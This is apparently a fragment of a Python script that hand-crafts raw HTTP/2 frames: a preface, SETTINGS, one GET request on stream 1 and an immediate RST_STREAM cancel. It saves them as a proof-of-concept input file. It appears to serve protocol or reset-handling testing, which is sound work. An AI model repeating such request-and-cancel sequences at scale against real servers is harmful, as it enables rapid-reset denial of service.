import struct
p=bytearray(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
def frame(t, flags, sid, payload=b''):
    return len(payload).to_bytes(3,'big')+bytes([t,flags])+((sid & 0x7fffffff).to_bytes(4,'big'))+payload
# client SETTINGS empty
p += frame(4,0,0,b'')
# HEADERS for stream 1: END_HEADERS|END_STREAM, hpack static :method GET, :scheme http, :path /, literal :authority empty
# indexed repr: 0x82 GET, 0x86 http, 0x84 /, 0x81 authority empty? Static index 1 :authority empty => 0x81
headers=bytes([0x82,0x86,0x84,0x81])
p += frame(1,0x05,1,headers)
# RST_STREAM stream 1 CANCEL(8)
p += frame(3,0,1,(8).to_bytes(4,'big'))
open('/workspace/poc_rst_active','wb').write(p)
print(len(p), p.hex())
PY
